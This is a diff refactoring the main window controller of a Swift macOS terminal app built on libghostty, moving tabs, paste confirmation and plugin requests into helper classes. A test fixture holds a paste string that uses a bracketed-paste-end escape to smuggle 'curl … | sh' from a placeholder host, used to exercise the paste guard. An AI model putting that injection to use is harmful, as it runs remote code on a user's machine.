@@ -1,7 +1,6 @@
 import AppKit
 import Combine
 import GhosttyKit
-import UserNotifications
 
 /// Our surface: it reports every user write path into the pty, so the core can retire a request the user
 /// may already have answered at the terminal. A subclass, so the vendored Ghostty sources stay unpatched;
@@ -103,23 +102,6 @@ final class HauntSurfaceView: Ghostty.SurfaceView {
     }
 }
 
-/// One sidebar row: a libghostty surface registered with the core.
-final class Tab {
-    let env: SurfaceEnv
-    let view: Ghostty.SurfaceView
-    /// Ghostty's scroll wrapper; it is what tells the surface its size.
-    let host: SurfaceScrollView
-    var subscriptions: [AnyCancellable] = []
-    /// Bumped per info report, so a slow branch lookup never overwrites a newer one.
-    var infoGeneration = 0
-
-    init(env: SurfaceEnv, view: Ghostty.SurfaceView, size: CGSize) {
-        self.env = env
-        self.view = view
-        host = SurfaceScrollView(contentSize: size, surfaceView: view)
-    }
-}
-
 /// Lays out title bar, sidebar and pane at fixed mockup sizes; without the sidebar, mockup 10's.
 private final class RootView: NSView {
     let titleBar = TitleBarView()
@@ -172,7 +154,6 @@ private final class RootView: NSView {
         sidebar.frame = NSRect(x: 0, y: top, width: Tok.Size.sidebarW, height: bounds.height - top)
         pane.frame = NSRect(x: w, y: top, width: bounds.width - w, height: bounds.height - top)
         scrim.frame = NSRect(x: 0, y: top, width: bounds.width, height: bounds.height - top)
-        for v in pane.subviews { v.frame = pane.bounds }
     }
 }
 
@@ -180,17 +161,27 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
     private let core: CoreAPI
     private let ghostty: Ghostty.App
     private let fixture: Fixture?
+    /// The mockups' window size in points.
+    private static let defaultSize = NSSize(width: 900, height: Tok.Size.windowH)
     private let config: HauntConfig
+    private let store = TabStore()
+    private let bridge: PluginBridge
+    private lazy var pasteGuard = PasteGuard(window: window) { [weak self] view in
+        guard let self, let tab = self.store.tab(for: view), tab.env.surfaceId != self.store.selectedId else { return }
+        self.select(tab.env.surfaceId)
+    }
     /// Set once the core has started, so the decision log is loaded before plugins read it.
-    var plugins: PluginsAPI?
+    var plugins: PluginsAPI? {
+        get { bridge.plugins }
+        set { bridge.plugins = newValue }
+    }
     private lazy var palette: PaletteController = {
         let p = PaletteController(host: self)
         p.sticky = fixture != nil
         return p
     }()
     private let root = RootView()
-    private(set) var tabs: [Tab] = []
-    private var selectedId: String?
+    var tabs: [Tab] { store.tabs }
     private var refreshQueued = false
     private var observers: [NSObjectProtocol] = []
     private var ticker: Timer?
@@ -203,7 +194,8 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
         self.ghostty = ghostty
         self.fixture = fixture
         self.config = config
-        let size = Fixture.windowSize
+        bridge = PluginBridge(core: core) { [store] bytes, id in store.write(bytes, to: id) }
+        let size = Self.defaultSize
         let win = NSWindow(contentRect: NSRect(origin: .zero, size: size),
                            styleMask: [.titled, .closable, .miniaturizable, .resizable, .fullSizeContentView],
                            backing: .buffered, defer: false)
@@ -232,8 +224,8 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
             }
         }
         // Fixtures neither read nor overwrite the user's saved state.
-        root.sidebarHidden = fixture?.sidebarHidden ?? config.loadState().sidebarHidden
-        agentsViewAtLaunch = fixture?.agentsView ?? config.loadState().agentsView
+        root.sidebarHidden = fixture?.sidebarHidden ?? config.state.sidebarHidden
+        agentsViewAtLaunch = fixture?.agentsView ?? config.state.agentsView
         updateKeys(config.keys)
         root.titleBar.buttons = fixture?.titlebarButtons ?? config.titlebarButtons
         root.sidebar.onSelect = { [weak self] id in self?.select(id) }
@@ -241,12 +233,12 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
         root.agents.list.onSelect = { [weak self] id in self?.expandAgentsView(to: id) }
         root.agents.list.onClose = { [weak self] id in self?.closeTab(id) }
         root.sidebar.onRename = { [weak self] id, name in
-            self?.customNames[id] = name.isEmpty ? nil : name
+            self?.store.customNames[id] = name.isEmpty ? nil : name
             self?.refresh()
         }
         root.sidebar.onRenameEnd = { [weak self] in self?.focusSelectedSurface() }
         root.sidebar.rowMenu = { [weak self] id in self?.plugins?.rowMenuItems(surfaceId: id) ?? [] }
-        root.sidebar.onRowMenu = { [weak self] item, id in self?.invokeRowMenuItem(item, surfaceId: id) }
+        root.sidebar.onRowMenu = { [weak self] item, id in self?.bridge.invokeRowMenu(item, surfaceId: id) }
         root.sidebar.onRowMoved = { [weak self] id, group, before in
             self?.plugins?.rowMoved(surfaceId: id, groupId: group, beforeSurfaceId: before)
         }
@@ -261,13 +253,13 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
 
     required init?(coder: NSCoder) { fatalError() }
 
-    func tab(for view: Ghostty.SurfaceView) -> Tab? { tabs.first { $0.view === view } }
+    func tab(for view: Ghostty.SurfaceView) -> Tab? { store.tab(for: view) }
 
     // MARK: Tabs
 
     func newTab(cwd: String? = nil, select selectIt: Bool = true) {
         guard let app = ghostty.app else { return }
-        let dir = cwd ?? tabs.first { $0.env.surfaceId == selectedId }?.view.pwd ?? NSHomeDirectory()
+        let dir = cwd ?? store.selected?.view.pwd ?? NSHomeDirectory()
         // The core refuses past its surface cap; no tab beats an unverifiable one.
         guard let env = try? core.registerSurface(cwd: dir) else { NSSound.beep(); return }
         var config = Ghostty.SurfaceConfiguration()
@@ -283,13 +275,10 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
         // Before the keystroke reaches the pty, so a late Allow/Deny can't be typed into a running tool.
         view.onInput = { [weak self] in self?.core.onUserInput(surfaceId: env.surfaceId) }
         view.onPasteConfirmation = { [weak self, weak view] req in
-            if let view { self?.confirmPaste(req, on: view) }
+            if let view { self?.pasteGuard.confirm(req, on: view) }
         }
         view.onRiskyPaste = { [weak self, weak view] text in
-            guard let self, let view else { return }
-            self.askPaste(PasteAsk(view: view, text: text, request: nil) { [weak view] ok in
-                if ok { view?.sendPaste(text) }
-            })
+            if let view { self?.pasteGuard.hold(text, on: view) }
         }
         // So the surface starts at the pane's real size.
         root.layoutSubtreeIfNeeded()
@@ -297,108 +286,19 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
         tab.subscriptions.append(view.$title.combineLatest(view.$pwd)
             .debounce(for: .milliseconds(50), scheduler: DispatchQueue.main)
             .sink { [weak self] title, pwd in self?.reportInfo(tab, title: title, pwd: pwd ?? dir) })
-        tabs.append(tab)
+        store.add(tab)
         tab.host.frame = root.pane.bounds
+        tab.host.autoresizingMask = [.width, .height]
         tab.host.isHidden = true
         root.pane.addSubview(tab.host)
-        if selectIt || selectedId == nil { select(env.surfaceId) } else { syncFocus() }
+        if selectIt || store.selectedId == nil { select(env.surfaceId) } else { syncFocus() }
     }
 
-    // MARK: Paste confirmation
-
-    /// One paste waiting for the user. `request` is Ghostty's, when it raised the question; it can be
-    /// withdrawn (replaced or cleared) before the sheet is answered.
-    private struct PasteAsk {
-        weak var view: HauntSurfaceView?
-        let text: String
-        let request: Ghostty.ClipboardConfirmationRequest?
-        let finish: (Bool) -> Void
-    }
-
-    /// One sheet at a time per window; asks from other surfaces wait their turn.
-    private var pasteQueue: [PasteAsk] = []
-    private var pasteShown: (ask: PasteAsk, alert: NSAlert)?
-
-    /// Ghostty's paste protection asks before an unsafe paste; nil withdraws what this surface had asked.
-    private func confirmPaste(_ request: Ghostty.ClipboardConfirmationRequest?, on view: HauntSurfaceView) {
-        let stale = { (a: PasteAsk) in a.view === view && a.request != nil && a.request !== request }
-        pasteQueue.removeAll(where: stale)
-        if let shown = pasteShown, stale(shown.ask) || shown.ask.view == nil {
-            pasteShown = nil
-            window?.endSheet(shown.alert.window, returnCode: .abort)
-        }
-        if let request {
-            askPaste(PasteAsk(view: view, text: request.contents, request: request) { [weak view] ok in
-                if ok { request.complete() } else { request.cancel() }
-                if view?.pendingClipboardConfirmation === request { view?.pendingClipboardConfirmation = nil }
-            })
-        }
-        showNextPaste()
-    }
-
-    private func askPaste(_ ask: PasteAsk) {
-        pasteQueue.append(ask)
-        showNextPaste()
-    }
-
-    private func showNextPaste() {
-        guard pasteShown == nil, let window else { return }
-        pasteQueue.removeAll { $0.view == nil }
-        guard !pasteQueue.isEmpty else { return }
-        let ask = pasteQueue.removeFirst()
-        if let view = ask.view, let tab = tab(for: view), tab.env.surfaceId != selectedId { select(tab.env.surfaceId) }
-        let alert = Self.pasteAlert(ask.text)
-        pasteShown = (ask, alert)
-        alert.beginSheetModal(for: window) { [weak self] r in
-            guard let self, self.pasteShown?.alert === alert else { return }
-            self.pasteShown = nil
-            ask.finish(r == .alertSecondButtonReturn)
-            // The next sheet can't begin until this one has finished ending.
-            DispatchQueue.main.async { self.showNextPaste() }
-        }
-    }
-
-    /// The whole paste, read-only and scrollable, with every control character spelled out (PastePreview).
-    /// Cancel is the default; pasting takes an explicit click.
-    static func pasteAlert(_ text: String) -> NSAlert {
-        let preview = PastePreview(text)
-        let alert = NSAlert()
-        alert.messageText = preview.lines == 1 ? "Paste 1 line?" : "Paste \(preview.lines) lines?"
-        var notes: [String] = []
-        if preview.hasPasteEnd {
-            notes.append("It contains a bracketed paste end (^[[201~): the text after it would run as typed commands.")
-        }
-        if preview.hasControls { notes.append("Control characters are shown as ^[ and \\u{…}.") }
-        alert.informativeText = notes.joined(separator: "\n")
-
-        let font = NSFont.monospacedSystemFont(ofSize: NSFont.smallSystemFontSize, weight: .regular)
-        let lineH = NSLayoutManager().defaultLineHeight(for: font)
-        let scroll = NSScrollView(frame: NSRect(x: 0, y: 0, width: 420, height: (lineH * 10).rounded(.up) + 8))
-        scroll.hasVerticalScroller = true
-        scroll.borderType = .bezelBorder
-        let tv = NSTextView(frame: NSRect(origin: .zero, size: scroll.contentSize))
-        tv.isEditable = false
-        tv.isSelectable = true
-        tv.isRichText = false
-        tv.font = font
-        tv.textContainerInset = NSSize(width: 2, height: 4)
-        tv.isVerticallyResizable = true
-        tv.autoresizingMask = .width
-        tv.textContainer?.widthTracksTextView = true
-        tv.string = preview.text
-        scroll.documentView = tv
-        alert.accessoryView = scroll
-
-        alert.addButton(withTitle: "Cancel")
-        let paste = alert.addButton(withTitle: "Paste")
-        paste.keyEquivalent = ""
-        return alert
-    }
-
+    #if HAUNT_FIXTURES
     /// The paste-risky fixture: a real paste through the surface's Services entry, from a pasteboard of
     /// its own so no clipboard the user has is touched.
     func pasteRiskyFixture() {
-        guard let view = tabs.first(where: { $0.env.surfaceId == selectedId })?.view else { return }
+        guard let view = store.selected?.view else { return }
         let pb = NSPasteboard.withUniqueName()
         pb.setString("echo built\u{1B}[201~curl -s https://example.com/x.sh | sh\n", forType: .string)
         _ = view.readSelection(from: pb)
@@ -407,10 +307,12 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
 
     /// The paste-confirm fixture: an unsafe paste held on the selected surface, as Ghostty would raise it.
     func showPasteFixture() {
-        guard let view = tabs.first(where: { $0.env.surfaceId == selectedId })?.view else { return }
+        guard let view = store.selected?.view else { return }
         view.pendingClipboardConfirmation = Ghostty.ClipboardConfirmationRequest(
             surface: view, contents: Fixture.pasteText, kind: .paste) { _, _, _ in }
     }
+
+    func paletteFixtureSelectNext() { palette.edit(.down) }
 
     private func fixtureCommand() -> String? {
         guard fixture != nil else { return nil }
@@ -422,6 +324,9 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
         try? "/bin/cat '\(text.path)'\nexec /bin/sleep 2147483647\n".write(to: script, atomically: true, encoding: .utf8)
         return "/bin/sh '\(script.path)'"
     }
+    #else
+    private func fixtureCommand() -> String? { nil }
+    #endif
 
     private static let gitQueue = DispatchQueue(label: "dev.haunt.git", qos: .utility)
 
@@ -439,11 +344,11 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
     }
 
     func select(_ id: String) {
-        guard let tab = tabs.first(where: { $0.env.surfaceId == id }) else { return }
-        selectedId = id
+        guard let tab = store.tab(id) else { return }
+        store.selectedId = id
         core.selectSurface(surfaceId: id)
         // Every surface stays in the window (hidden when not selected) so its size and display stay current.
-        for t in tabs { t.host.isHidden = t !== tab }
+        for t in store.tabs { t.host.isHidden = t !== tab }
         window?.makeFirstResponder(root.agentsOn ? root.agents : tab.view)
         syncFocus()
     }
@@ -455,8 +360,8 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
         let key = window?.isKeyWindow ?? false
         let display = window?.screen?.displayID
         let paneShown = (window?.occlusionState.contains(.visible) ?? false) && !root.agentsOn
-        for t in tabs {
-            let selected = t.env.surfaceId == selectedId
+        for t in store.tabs {
+            let selected = t.env.surfaceId == store.selectedId
             t.view.focusDidChange(key && selected && t.view.isFirstResponder)
             guard let surface = t.view.surface else { continue }
             ghostty_surface_set_occlusion(surface, paneShown && selected)
@@ -475,17 +380,17 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
     func selectAdjacent(_ step: Int) {
         let ids = root.sidebar.orderedIds
         guard !ids.isEmpty else { return }
-        let i = selectedId.flatMap(ids.firstIndex(of:)) ?? 0
+        let i = store.selectedId.flatMap(ids.firstIndex(of:)) ?? 0
         select(ids[((i + step) % ids.count + ids.count) % ids.count])
     }
 
     func closeSelectedTab() {
-        if let id = selectedId { closeTab(id) }
+        if let id = store.selectedId { closeTab(id) }
     }
 
     /// Like ⌘W on that tab: Ghostty asks for confirmation when a process is running.
     func closeTab(_ id: String) {
-        guard let surface = tabs.first(where: { $0.env.surfaceId == id })?.view.surface else { return }
+        guard let surface = store.tab(id)?.view.surface else { return }
         ghostty.requestClose(surface: surface)
     }
 
@@ -503,21 +408,20 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
     }
 
     private func remove(_ tab: Tab) {
-        guard let i = tabs.firstIndex(where: { $0 === tab }) else { return }
+        guard store.tabs.contains(where: { $0 === tab }) else { return }
         let order = root.sidebar.orderedIds
         let pos = order.firstIndex(of: tab.env.surfaceId)
         tab.subscriptions.removeAll()
         tab.host.removeFromSuperview()
-        tabs.remove(at: i)
-        customNames[tab.env.surfaceId] = nil
+        store.remove(tab)
         core.unregisterSurface(surfaceId: tab.env.surfaceId)
-        guard !tabs.isEmpty else {
+        guard let first = store.tabs.first else {
             window?.close()
             return
         }
-        if selectedId == tab.env.surfaceId {
+        if store.selectedId == tab.env.surfaceId {
             let rest = order.filter { $0 != tab.env.surfaceId }
-            let next = pos.map { rest[min($0, rest.count - 1)] } ?? tabs[0].env.surfaceId
+            let next = pos.map { rest[min($0, rest.count - 1)] } ?? first.env.surfaceId
             select(next)
         }
         refresh()
@@ -532,7 +436,7 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
         DispatchQueue.main.async { [weak self] in
             self?.refreshQueued = false
             self?.refresh()
-            self?.drainPluginRequests()
+            self?.bridge.drain()
         }
     }
 
@@ -547,25 +451,15 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
         refresh()
         let t = Timer(timeInterval: 1, repeats: true) { [weak self] _ in
             self?.refresh()
-            self?.drainPluginRequests()
+            self?.bridge.drain()
         }
         t.tolerance = 0.2
         RunLoop.main.add(t, forMode: .common)
         ticker = t
     }
 
-    /// Names given with Rename Tab, for the life of the tab. They replace only the row title.
-    private var customNames: [String: String] = [:]
-
     func refresh() {
-        var snap = core.snapshot()
-        if !customNames.isEmpty {
-            for g in snap.groups.indices {
-                for r in snap.groups[g].rows.indices {
-                    if let n = customNames[snap.groups[g].rows[r].surfaceId] { snap.groups[g].rows[r].name = n }
-                }
-            }
-        }
+        let snap = store.named(core.snapshot())
         if snap != root.sidebar.snapshot { root.sidebar.snapshot = snap }
         if root.agentsOn { root.agents.update(snap) }
         let sel = snap.groups.lazy.flatMap(\.rows).first { $0.selected }
@@ -581,7 +475,7 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
     var isRenaming: Bool { root.sidebar.isRenaming }
 
     func renameSelectedTab(text: String? = nil) {
-        guard let id = selectedId else { return }
+        guard let id = store.selectedId else { return }
         if root.sidebarHidden { toggleSidebar() }
         root.sidebar.beginRename(id, text: text)
     }
@@ -589,7 +483,7 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
     func setCustomName(_ name: String, at index: Int) {
         let ids = root.sidebar.orderedIds
         guard ids.indices.contains(index) else { return }
-        customNames[ids[index]] = name
+        store.customNames[ids[index]] = name
         refresh()
     }
 
@@ -597,11 +491,7 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
         root.sidebarHidden.toggle()
         onSidebarToggle?()
         root.layoutSubtreeIfNeeded()
-        if fixture == nil {
-            var state = config.loadState()
-            state.sidebarHidden = root.sidebarHidden
-            config.saveState(state)
-        }
+        if fixture == nil { config.updateState { $0.sidebarHidden = root.sidebarHidden } }
     }
 
     /// The zen hint and anything else that shows a shortcut follow the `[keys]` table.
@@ -631,50 +521,6 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
         palette.open(over: window, top: TitleBarView.height(zen: root.sidebarHidden) + Tok.Size.paletteTop, text: text)
     }
 
-    func paletteFixtureSelectNext() { palette.edit(.down) }
-
-    /// Writes bytes the core handed back for a surface, as `ghostty_surface_text` does for typed text.
-    private func write(_ bytes: Data, to surfaceId: String) {
-        guard !bytes.isEmpty, let surface = tabs.first(where: { $0.env.surfaceId == surfaceId })?.view.surface else { return }
-        bytes.withUnsafeBytes { buf in
-            guard let p = buf.baseAddress?.assumingMemoryBound(to: CChar.self) else { return }
-            ghostty_surface_text(surface, p, UInt(buf.count))
-        }
-    }
-
-    // MARK: Plugins
-
-    /// `.notify` becomes a macOS notification; a `.ptyAnswer` is written only as the bytes the core's gate returns.
-    func drainPluginRequests() {
-        guard let plugins else { return }
-        for req in plugins.takeRequests() {
-            switch req {
-            case let .notify(pluginId, title, body, _, _):
-                Self.notify(pluginId: pluginId, title: title, body: body)
-            case .ptyAnswer:
-                guard let w = core.gatePluginRequest(request: req) else { continue }
-                write(w.bytes, to: w.surfaceId)
-            }
-        }
-    }
-
-    private static var askedNotifications = false
-
-    private static func notify(pluginId: String, title: String, body: String) {
-        let center = UNUserNotificationCenter.current()
-        let post = {
-            let content = UNMutableNotificationContent()
-            content.title = title
-            // Names the plugin, so a plugin can't pass its notification off as Haunt's own.
-            content.subtitle = pluginId
-            content.body = body
-            center.add(UNNotificationRequest(identifier: UUID().uuidString, content: content, trigger: nil))
-        }
-        guard !askedNotifications else { return post() }
-        askedNotifications = true
-        center.requestAuthorization(options: [.alert, .sound]) { granted, _ in if granted { post() } }
-    }
-
     /// The core keeps running without its socket; agent rows then only get OSC status.
     func showStartError(_ error: Error) {
         guard let window else { return }
@@ -684,6 +530,8 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
         alert.beginSheetModal(for: window)
     }
 
+    /// Plugin requests waiting since the last core event; the app delegate drains once at launch.
+    func drainPluginRequests() { bridge.drain() }
 
     // MARK: Title bar
 
@@ -710,11 +558,7 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
 
     func toggleAgentsView() {
         setAgentsView(!root.agentsOn, animate: true)
-        if fixture == nil {
-            var state = config.loadState()
-            state.agentsView = root.agentsOn
-            config.saveState(state)
-        }
+        if fixture == nil { config.updateState { $0.agentsView = root.agentsOn } }
     }
 
     /// A row click: the full window comes back on that tab.
@@ -734,7 +578,7 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
             window.collectionBehavior.insert(.fullScreenNone)
             refresh()
             window.minSize = NSSize(width: Tok.Size.narrowW - 2, height: 200)
-            let frame = AgentsView.dockedFrame(on: window.screen ?? NSScreen.main, height: fixture.map { _ in Fixture.narrowHeight })
+            let frame = AgentsView.dockedFrame(on: window.screen ?? NSScreen.main, height: fixture == nil ? nil : Fixture.narrowHeight)
             window.setFrame(frame, display: true, animate: animate)
             window.makeFirstResponder(root.agents)
         } else {
@@ -749,7 +593,7 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
             root.agents.restore = nil
             root.agentsOn = false
             root.layoutSubtreeIfNeeded()
-            if let tab = tabs.first(where: { $0.env.surfaceId == selectedId }) { window.makeFirstResponder(tab.view) }
+            if let tab = store.selected { window.makeFirstResponder(tab.view) }
         }
         syncFocus()
     }
@@ -787,8 +631,8 @@ final class MainWindowController: NSWindowController, NSWindowDelegate {
     func windowWillClose(_ notification: Notification) {
         ticker?.invalidate()
         ticker = nil
-        for t in tabs { core.unregisterSurface(surfaceId: t.env.surfaceId) }
-        tabs.removeAll()
+        for t in store.tabs { core.unregisterSurface(surfaceId: t.env.surfaceId) }
+        store.removeAll()
     }
 }
 
@@ -799,33 +643,15 @@ extension MainWindowController: PaletteHost {
         return order.compactMap { rows[$0] }
     }
 
-    var selectedSurfaceId: String? { selectedId }
+    var selectedSurfaceId: String? { store.selectedId }
 
-    var palettePlugins: PluginsAPI? { plugins }
+    var palettePlugins: PluginsAPI? { bridge.plugins }
 
-    var pluginLoadErrors: [String] { plugins?.loadErrors() ?? [] }
+    var pluginLoadErrors: [String] { bridge.loadErrors }
 
     func paletteSelectTab(_ surfaceId: String) { select(surfaceId) }
 
-    func paletteInvoke(pluginId: String, itemId: String) {
-        do {
-            try plugins?.invokePaletteItem(pluginId: pluginId, itemId: itemId)
-        } catch {
-            AppDelegate.logger.error("plugin \(pluginId, privacy: .public) item \(itemId, privacy: .public): \(String(describing: error), privacy: .public)")
-            NSSound.beep()
-        }
-        drainPluginRequests()
-    }
-
-    func invokeRowMenuItem(_ item: RowMenuItem, surfaceId: String) {
-        do {
-            try plugins?.invokeRowMenuItem(pluginId: item.pluginId, itemId: item.id, surfaceId: surfaceId)
-        } catch {
-            AppDelegate.logger.error("plugin \(item.pluginId, privacy: .public) row item \(item.id, privacy: .public): \(String(describing: error), privacy: .public)")
-            NSSound.beep()
-        }
-        drainPluginRequests()
-    }
+    func paletteInvoke(pluginId: String, itemId: String) { bridge.invoke(pluginId: pluginId, itemId: itemId) }
 
     var paletteKeys: KeyMap { config.keys }
 
@@ -841,7 +667,7 @@ extension MainWindowController: PaletteHost {
 
     private func focusSelectedSurface() {
         guard let window else { return }
-        if let tab = tabs.first(where: { $0.env.surfaceId == selectedId }) { window.makeFirstResponder(tab.view) }
+        if let tab = store.selected { window.makeFirstResponder(tab.view) }
         syncFocus()
     }
 }
